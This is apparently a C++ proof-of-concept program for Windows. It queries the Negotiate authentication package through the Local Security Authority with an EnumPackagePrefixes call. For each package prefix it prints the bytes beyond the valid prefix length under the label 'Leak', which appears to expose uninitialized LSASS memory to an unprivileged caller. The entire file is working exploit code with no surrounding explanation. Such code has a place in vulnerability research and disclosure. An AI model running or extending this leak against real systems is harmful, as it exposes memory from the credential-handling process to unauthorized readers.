#include <Windows.h>

#define SECURITY_WIN32
#include <codecvt>
#include <iomanip>
#include <iostream>
#include <locale>
#include <ntsecapi.h>
#include <security.h>
#include <string>
#include <vector>
#include <winerror.h>

#pragma comment(lib, "Secur32.lib")

constexpr auto MaxPrefix() {
    return 32;
}

enum class PROTOCOL_MESSAGE_TYPE : ULONG {
    EnumPackagePrefixes,
    GetCallerName,
    TransferCred,
    EnumPackageNames
};

typedef struct _PACKAGE_PREFIX {
    ULONG_PTR PackageId;
    PVOID PackageDataA; // Unused, set to nullptr by negotiate
    PVOID PackageDataW; // Unused, set to nullptr by negotiate
    ULONG_PTR PrefixLen;
    UCHAR Prefix[MaxPrefix()];
} PACKAGE_PREFIX, * PPACKAGE_PREFIX;

typedef struct _PACKAGE_PREFIXES {
    ULONG MessageType;
    ULONG PrefixCount;
    ULONG Offset; // Offset to array of PACKAGE_PREFIX
    ULONG Pad;
} PACKAGE_PREFIXES, * PPACKAGE_PREFIXES;

void OutputHex(std::ostream& out, const std::string& data) {
    for (const auto& item : data) {
        out << std::setw(2) << std::setfill('0') << std::hex << static_cast<int>(static_cast<unsigned char>(item));
    }
}

int wmain() {
    HANDLE lsaHandle;
    if (SUCCEEDED(LsaConnectUntrusted(&lsaHandle))) {
        std::vector<char> buffer{ NEGOSSP_NAME_A, NEGOSSP_NAME_A + sizeof(NEGOSSP_NAME_A) };
        LSA_STRING apName = { buffer.size() - 1, buffer.size(), buffer.data() };
        ULONG apId;
        if (SUCCEEDED(LsaLookupAuthenticationPackage(lsaHandle, &apName, &apId))) {
            auto request{ PROTOCOL_MESSAGE_TYPE::EnumPackagePrefixes };
            PPACKAGE_PREFIXES response;
            ULONG responseSize;
            NTSTATUS status;
            std::cout << "Negotiate -> EnumPackagePrefixes Output" << std::endl;
            if (SUCCEEDED(LsaCallAuthenticationPackage(lsaHandle, apId, &request, sizeof(request), reinterpret_cast<PVOID*>(&response), &responseSize, &status)) && SUCCEEDED(status)) {
                std::cout << "PrefixCount: " << response->PrefixCount << std::endl;
                auto offset{ reinterpret_cast<byte*>(response) + response->Offset };
                for (size_t count{ response->PrefixCount }; count > 0; count--) {
                    auto packagePrefix{ reinterpret_cast<PPACKAGE_PREFIX>(offset) };
                    std::cout << "Id: " << std::to_string(packagePrefix->PackageId) + ", Prefix[0x" << packagePrefix->PrefixLen << "]: ";
                    OutputHex(std::cout, std::string(reinterpret_cast<char*>(packagePrefix->Prefix), packagePrefix->PrefixLen));
                    std::cout << std::endl
                        << "              Leak: ";
                    OutputHex(std::cout, std::string(reinterpret_cast<char*>(packagePrefix->Prefix) + packagePrefix->PrefixLen, MaxPrefix() - packagePrefix->PrefixLen));
                    std::cout << std::endl;
                    offset += sizeof(PACKAGE_PREFIX);
                }
                LsaFreeReturnBuffer(response);
            }
        }
        LsaDeregisterLogonProcess(lsaHandle);
    }
}
